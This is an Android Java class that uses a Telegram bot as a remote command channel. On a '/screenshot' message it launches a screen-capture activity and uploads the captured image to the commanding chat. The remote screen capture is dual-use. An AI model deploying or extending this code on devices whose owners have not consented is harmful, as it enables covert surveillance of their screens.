package com.remotecontrol;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class TelegramEngine implements Runnable {

    private static final String TAG = "TelegramEngine";
    private final String botToken;
    private final Context context;
    private static final String API_BASE = "https://api.telegram.org/bot";
    private final OkHttpClient httpClient;
    private volatile boolean running = true;
    private long lastUpdateId = 0;

    public TelegramEngine(Context context, String botToken, String miniAppUrl) {
        this.context = context.getApplicationContext();
        this.botToken = botToken;
        this.httpClient = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();
    }

    @Override
    public void run() {
        Log.i(TAG, "🚀 Цикл Long Polling запущен");
        while (running) {
            try {
                getUpdates();
            } catch (Exception e) {
                Log.e(TAG, "❌ Ошибка в getUpdates: " + e.getMessage());
                sleep(5000);
            }
        }
    }

    public void stop() {
        this.running = false;
        Log.i(TAG, "🛑 Остановка TelegramEngine...");
    }

    private void getUpdates() throws IOException, JSONException {
        String url = API_BASE + botToken + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=20";
        Request request = new Request.Builder().url(url).build();

        try (Response response = httpClient.newCall(request).execute()) {
            if (!response.isSuccessful()) return;
            String body = response.body().string();
            JSONObject json = new JSONObject(body);
            if (!json.getBoolean("ok")) return;

            JSONArray updates = json.getJSONArray("result");
            for (int i = 0; i < updates.length(); i++) {
                JSONObject update = updates.getJSONObject(i);
                lastUpdateId = update.getLong("update_id");
                handleUpdate(update);
            }
        }
    }

    private void handleUpdate(JSONObject update) throws JSONException {
        if (update.has("message")) {
            JSONObject msg = update.getJSONObject("message");
            long chatId = msg.getJSONObject("chat").getLong("id");
            String text = msg.optString("text", "");

            if (text.equals("/screenshot")) {
                Log.i(TAG, "📸 Команда скриншота принята");
                Intent intent = new Intent(context, ScreenCaptureRequestActivity.class);
                intent.putExtra("chat_id", chatId);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            }
        }
    }

    public void sendPhoto(long chatId, File photo) {
        Log.i(TAG, "📤 Отправка файла в Telegram...");
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", String.valueOf(chatId))
                .addFormDataPart("photo", photo.getName(),
                        RequestBody.create(photo, MediaType.parse("image/jpeg")))
                .build();

        Request request = new Request.Builder()
                .url(API_BASE + botToken + "/sendPhoto")
                .post(requestBody)
                .build();

        try (Response response = httpClient.newCall(request).execute()) {
            if (response.isSuccessful()) {
                Log.i(TAG, "✅ Скриншот отправлен успешно");
            } else {
                Log.e(TAG, "❌ Ошибка API: " + response.code());
            }
        } catch (IOException e) {
            Log.e(TAG, "🚨 Ошибка сети: " + e.getMessage());
        } finally {
            if (photo.exists()) photo.delete();
        }
    }

    public void sendMessage(long chatId, String text) {
        String url = API_BASE + botToken + "/sendMessage";
        JSONObject json = new JSONObject();
        try {
            json.put("chat_id", chatId);
            json.put("text", text);
        } catch (JSONException ignored) {}
        
        RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json"));
        Request request = new Request.Builder().url(url).post(body).build();
        httpClient.newCall(request).enqueue(new okhttp3.Callback() {
            @Override public void onFailure(okhttp3.Call call, IOException e) {}
            @Override public void onResponse(okhttp3.Call call, Response response) throws IOException {
                response.close();
            }
        });
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }
}
